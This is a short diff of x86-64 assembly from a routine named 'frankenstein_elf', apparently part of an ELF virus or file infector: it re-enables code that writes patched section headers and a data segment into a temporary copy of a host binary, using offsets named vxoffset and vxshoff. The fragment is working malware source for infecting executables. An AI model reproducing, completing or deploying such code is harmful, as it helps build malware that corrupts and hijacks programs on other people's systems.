@@ -968,9 +968,9 @@ frankenstein_elf:
 		
 
 	.write_datasegment_totemp:
-		mov rdx, [r14 + filestat.st_size]
+		;mov rdx, [r14 + filestat.st_size]
 		;sub edx, dword [oshoff]
-		;mov rdx, [oshoff]
+		mov rdx, [oshoff]
 		;sub edx, dword [data_offset_original]
 		sub edx, dword [vxoffset]
 		;add edx, dword [host_shdrs_len]
@@ -987,12 +987,14 @@ frankenstein_elf:
 		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
-		;mov rdx, [r14 + filestat.st_size]
-		;sub edx, dword [oshoff]
+		mov rdx, [r14 + filestat.st_size]
+		sub edx, dword [oshoff]
+		lea rsi, [r13 + elf_ehdr]
+		add rsi, qword [oshoff]
 		;mov rsi, [SHDR_OFFSET_HOST]
-		;mov r10d, dword [vxshoff]
-		;mov rax, SYS_PWRITE64
-		;syscall
+		mov r10d, dword [vxshoff]
+		mov rax, SYS_PWRITE64
+		syscall
 ;		jmp .close_temp		
 
 		
